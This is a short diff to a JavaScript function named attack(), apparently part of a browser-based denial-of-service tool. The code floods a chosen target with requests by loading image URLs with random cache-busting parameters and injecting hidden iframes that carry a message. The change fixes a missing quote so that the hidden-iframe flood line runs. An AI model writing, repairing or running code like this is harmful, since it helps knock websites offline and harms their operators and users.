@@ -8,7 +8,7 @@ function attack() {
   var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
   pic.src = 'http://'+target+"/?r="+rand;
     
-    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>;
+    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
   
 
                     img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
